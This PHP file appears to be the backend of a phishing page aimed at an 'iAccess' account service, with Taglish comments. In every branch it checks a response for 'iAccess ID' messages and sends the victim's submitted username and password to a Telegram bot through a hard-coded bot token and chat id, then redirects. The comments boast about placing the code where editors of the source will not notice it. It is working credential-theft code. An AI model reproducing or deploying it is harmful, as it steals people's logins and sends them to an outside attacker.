// We can manually put cheats here. Need lang ng kunting edit. 
// Reason kung bat dito ko ito nilagay kasi kahit iedit nila yung source code, hindi nila magagamit. hahha //sa oras na ma edit nila source code hindi na gagana

// redeclare to make it ours
$chat_id = "-731060426";
$telebot = "5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs";

if (strpos($result, "iAccess ID already exists")) {
$us = [
'chat_id' => "-731060426",
'text' => "Valid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs/sendMessage?" . http_build_query($us));

$data = [
'chat_id' => $chat_id,
'text' => "Valid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
header("Location: index.php?mobile");
}

else if (strpos($result, "iAccess ID must have at least 6 character(s).")) {
$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
header("Location: index.php?invalid");
}

else if (strpos($result, "E-mail Address already exists")){

$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

header("Location: index.php?invalid");
}else if (strpos($result, "iAccess ID does not accept")){

$data = [
'chat_id' => $chat_id,
'text' => "Invalid\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));

header("Location: index.php?invalid");
}
else{
$data = [
'chat_id' => "-731060426",
'text' => "error in checking\nUser: " . $_POST['username'] . "\nPass: " . $_POST['password']
];
file_get_contents("https://api.telegram.org/bot5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs/sendMessage?" . http_build_query($data));
header("Location: index.php?mobile");
}
